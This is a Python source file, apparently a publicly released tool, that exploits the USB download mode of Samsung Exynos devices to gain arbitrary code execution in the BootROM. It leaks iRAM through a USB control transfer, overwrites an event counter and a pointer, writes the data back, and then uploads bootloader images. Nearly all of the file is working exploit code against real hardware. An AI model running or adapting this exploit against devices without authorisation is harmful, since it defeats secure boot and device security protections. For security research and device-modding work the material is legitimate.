import usb.core
import usb.util
import usb.backend.libusb1
import libusb
import tarfile
import lz4.frame
import argparse
import struct
import sys
import os
import coloredlogs
import logging
from time import sleep

soc     = ""
logger  = logging.getLogger(__name__)
debug_mode = False
output_file_path = ""
console_output = False

def write_u32(value):
    return struct.pack('<I', value)

def write_header(data, size):
    data[4:8] = write_u32(size)

def load_file(file_input, is_payload):
    try:
        if isinstance(file_input, str):  # If input is a filename
            with open(file_input, 'rb') as file:
                file_data = file.read()
        elif isinstance(file_input, bytes):  # If input is raw bytes
            file_data = file_input
        else:
            raise TypeError("Invalid file input type. Must be filename (str) or raw data (bytes).")

        size = len(file_data) + 10

        block = bytearray(size)
        block[8:8+len(file_data)] = file_data

        return block
    except Exception as e:
        logger.critical(f"Error loading file: {e}")
        return None

def calculate_checksum(data):
    checksum = sum(data[8:-2]) & 0xFFFF
    logger.warning(f"=> Data checksum {checksum:04X}")
    data[-2:] = struct.pack('<H', checksum)

def find_device():
    usb_backend = None
    device_connection_attempts = 0

    if os.name == "nt":
        usb_backend = usb.backend.libusb1.get_backend(find_library=lambda x: libusb.dll._name)

    while True:
        device = usb.core.find(idVendor=0x04e8, idProduct=0x1234, backend=usb_backend)

        if device is None:
            if device_connection_attempts == 15:
                device_connection_attempts = 0

                print()
                logger.debug(f"Tip: Plug in your device with the power button pressed.")

            print(".", end="", flush=True)
            device_connection_attempts += 1
            sleep(1)
        else:
            print()
            return device

def hexdump(data, length=16):
    for i in range(0, len(data), length):
        chunk = data[i:i+length]
        hex_str = ' '.join(f'{b:02X}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        logger.critical(f'{i:08X}  {hex_str:<{length*3}}  {ascii_str}')

def send_payload(device, file_path):
    logger.warning("Uploading payload.")
    file = load_file(file_path, True)

    write_header(file, 0x0000FF00)
    calculate_checksum(file)

    ret = device.write(2, file, timeout=50000)

    logger.info(f"=> Payload sent sucessfully!")

def send_file(device, file_path):
    logger.warning("Uploading file.")
    file = load_file(file_path, False)
    file_size = len(file)
    output_data = [] 

    write_header(file, file_size)
    calculate_checksum(file)

    ret = device.write(2, file, timeout=50000)

    if output_file_path or console_output == True:
        while True:
            try:
                data = device.read(0x81, 512, timeout=1000)
                data = data[:-1]
                output_data.append(data)
            except:
                break

    output_bytes = bytearray()
    for data in output_data:
        output_bytes.extend(data)

    if console_output == True:
        logger.info("Device Response:")
        hexdump(output_bytes)

    if output_file_path:
        logger.debug(f"Saving device response to {output_file_path}")
        output = open(output_file_path, "wb")
        output.write(output_bytes)
        output.close()
        logger.info("Saved?")

    if ret != file_size:
        logger.critical(f"=> Houston, we have a problem, the file was rejected.")
        sys.exit(-1)
    else:
        logger.info(f"=> File sent sucessfully!")

def send_dummy_data(device):
    logger.warning("Uploading empty data.")
    file = bytearray(12 * 1024)
    output_data = []

    write_header(file, 12 * 1024)
    calculate_checksum(file)

    ret = device.write(2, file, timeout=50000)

    if output_file_path or console_output == True:
        while True:
            try:
                data = device.read(0x81, 512, timeout=1000)
                output_data.append(data)
            except:
                break

    output_bytes = bytearray()
    for data in output_data:
        output_bytes.extend(data)

    if console_output == True:
        logger.info("Device Response:")
        hexdump(output_bytes)

    if output_file_path:
        logger.debug(f"Saving device response to {output_file_path}")
        output = open(output_file_path, "wb")
        output.write(output_bytes)
        output.close()
        logger.info("Saved?")

    if ret != 12 * 1024:
        logger.critical(f"=> Houston, we have a problem, the data was rejected.")
        sys.exit(-1)
    else:
        logger.info(f"=> Data sent sucessfully!")

def overwrite_iram(device):
    logger.warning("Leaking iRAM.")

    data = bytearray(device.ctrl_transfer(0x80, 0x08, 0x00, 0x00, 0x0494, timeout=1000))

    if debug_mode == True:
        logger.warning("Data Leaked:")
        hexdump(data)

    events = int.from_bytes(data[0x480:0x484], byteorder='little')

    addr = int.from_bytes(data[0x490:0x494], byteorder='little')

    data[0x480:0x484] = write_u32(events + 5)

    data[0x490:0x494] = write_u32(0x02022010)

    if debug_mode == True:
        logger.warning("New Data:")
        hexdump(data)

    logger.warning(f"Writing modified iRAM.")

    try:
        device.ctrl_transfer(0x00, 0x08, 0x00, 0x00, data, timeout=1000)
    except:
        logger.info("Device didn't return, USB most likely re-inited meaning we have ACE!")

def display_and_verify_device_info(device):
    global soc

    device_config = device.get_active_configuration()

    soc = usb.util.get_string(device, device.iProduct)
    usb_serial_num = usb.util.get_string(device, device.iSerialNumber)
    usb_booting_version = usb.util.get_string(device, device_config[(0, 0)].iInterface)

    print()
    logger.debug(f"==================== Device Information ====================")
    logger.info(f"SoC: {soc}".center(60))
    logger.info(f"SoC ID: {usb_serial_num[0:15]}".center(60))
    logger.info(f"Chip ID: {usb_serial_num[15:31]}".center(60))
    logger.info(f"USB Booting Version: {usb_booting_version[12:16]}".center(60))
    print()

def main():
    global verbose
    global debug_mode
    global output_file_path
    global console_output

    coloredlogs.install(
        level="DEBUG",
        fmt="%(asctime)s %(message)s",
        level_styles={
            'debug': {'color': 'magenta'},
            'info': {'color': 'green'},
            'warning': {'color': 'white', 'bold': True},
            'error': {'color': 'yellow', 'bold': True},
            'critical': {'color': 'red', 'bold': True},
        },
        field_styles={
            'asctime': {'color': 'blue'},
            'levelname': {'bold': True},
        }
    )

    logger.critical(r"""
                                                                              
88                                                                            
88                                              ,d                            
88                                              88                            
88,dPPYba,   ,adPPYba,  88       88 ,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,   
88P'    "8a a8"     "8a 88       88 I8[    ""   88   a8"     "8a 88P'   `"8a  
88       88 8b       d8 88       88  `"Y8ba,    88   8b       d8 88       88  
88       88 "8a,   ,a8" "8a,   ,a88 aa    ]8I   88,  "8a,   ,a8" 88       88  
88       88  `"YbbdP"'   `"YbbdP'Y8 `"YbbdP"'   "Y888 `"YbbdP"'  88       88  
                                                                              
                                                                              
    """)
    print("We had a problem - and now, publicly, a solution :)")
    print("Version 1.0 (c) 2025 Umer Uddin <umer.uddin@mentallysanemainliners.org>")
    print()
    logger.error("Notice: This program and it's source code is licensed under GPL 2.0.")
    print()

    parser = argparse.ArgumentParser(description="Exploit for Exynos devices to gain ACE in BootROM context.")
    parser.add_argument('-p', '--payload', type=str, help="Path to the payload to launch", required=True)
    parser.add_argument('-d', '--debug', action="store_true", help="Debug Mode", required=False)
    parser.add_argument('-o', '--output', type=str, help="Path to where to save payload output to", required=False)
    parser.add_argument('-c', '--console-output', action="store_true", help="Show output to console", required=False)

    args = parser.parse_args()

    debug_mode = args.debug
    output_file_path = args.output
    console_output = args.console_output

    if args.payload:
        if os.path.isfile(args.payload):
            logger.warning(f"Using file: {args.payload}")
        else:
            logger.critical(f"Error: The file {args.payload} does not exist or is not a valid file.")
            sys.exit(-1)

    if args.output:
        logger.warning(f"Output file: {args.output}")

    logger.warning("Waiting for device")
    device = find_device()
    logger.warning("Found device.")

    display_and_verify_device_info(device)

    logger.warning(f"Start exploit.")
    print()

    if os.name != "nt":
        if device.is_kernel_driver_active(0):
            device.detach_kernel_driver(0)

    usb.util.claim_interface(device, 0)

    send_payload(device, args.payload)

    overwrite_iram(device)

    logger.error("Wait for USB to re-initialise.")
    sleep(2)
    device = find_device()
    logger.warning("Found device.")

    if os.name != "nt":
        if device.is_kernel_driver_active(0):
            device.detach_kernel_driver(0)

    usb.util.claim_interface(device, 0)

    logger.error("Payload online, transition to hubble.")
    send_file(device, "bootloader-splits/epbl.img")
    send_file(device, "bootloader-splits/bl2.img")
    send_file(device, "bootloader-splits/lk.bin")
    send_file(device, "bootloader-splits/el3_mon.img")
    send_file(device, "bootloader-splits/ldfw.img")
    send_file(device, "bootloader-splits/tzsw.img")

if __name__ == "__main__":
    main()
